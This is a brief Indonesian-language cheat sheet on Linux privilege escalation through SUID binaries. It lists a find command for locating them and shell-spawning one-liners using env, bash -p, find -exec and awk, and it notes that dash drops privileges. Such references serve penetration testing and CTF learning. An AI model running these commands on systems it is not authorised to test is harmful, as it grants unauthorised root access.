# Exploiting SUID

## Cari SUID binary
```bash
find / -perm -4000 -type f 2>/dev/null
```

## Cek GTFOBins
Untuk tiap binary -> cek https://gtfobins.github.io bagian "SUID"

## Pola Umum
```bash
./binary -p ...                              # -p mempertahankan euid
env /bin/sh -p                               # SUID env
bash -p                                      # SUID bash
find . -exec /bin/sh -p \; -quit             # SUID find
awk 'BEGIN{system("/bin/sh")}'               # SUID awk (mawk)
```

## Catatan Penting
Payload via `system()` -> `/bin/sh` (dash) bisa **DROP privilege**.

**Solusi:**
- Gunakan binary yang `execve` langsung (`env`/`find`)
- Atau gunakan `/bin/bash -p`
